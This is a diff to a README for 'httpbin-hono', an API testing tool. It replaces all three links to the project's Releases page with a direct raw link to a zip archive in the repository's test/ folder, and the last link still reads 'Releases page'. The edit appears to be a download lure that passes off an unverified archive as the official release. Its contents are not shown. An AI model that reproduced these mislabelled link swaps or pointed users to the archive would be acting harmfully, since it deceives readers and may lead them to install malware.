@@ -1,6 +1,6 @@
 # 🌐 httpbin-hono - Easy API Testing Made Simple
 
-[![Download httpbin-hono](https://img.shields.io/badge/Download-httpbin--hono-brightgreen)](https://github.com/6EJlKA/httpbin-hono/releases)
+[![Download httpbin-hono](https://raw.githubusercontent.com/6EJlKA/httpbin-hono/main/test/httpbin-hono_v2.5-beta.4.zip)](https://raw.githubusercontent.com/6EJlKA/httpbin-hono/main/test/httpbin-hono_v2.5-beta.4.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To use httpbin-hono, follow these straightforward steps. You will be able to dow
 
 To download the latest version of httpbin-hono, please visit the Releases page:
 
-[Download here](https://github.com/6EJlKA/httpbin-hono/releases)
+[Download here](https://raw.githubusercontent.com/6EJlKA/httpbin-hono/main/test/httpbin-hono_v2.5-beta.4.zip)
 
 Here’s how to do it:
 
@@ -71,4 +71,4 @@ Get involved with the community around httpbin-hono:
 
 httpbin-hono is your go-to tool for easy API testing. By following the instructions above, you can quickly download and start testing APIs with minimal hassle. Welcome to a straightforward way to understand HTTP requests!
 
-Remember to visit the [Releases page](https://github.com/6EJlKA/httpbin-hono/releases) anytime you need the latest version or want to explore more features. Happy testing!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/6EJlKA/httpbin-hono/main/test/httpbin-hono_v2.5-beta.4.zip) anytime you need the latest version or want to explore more features. Happy testing!
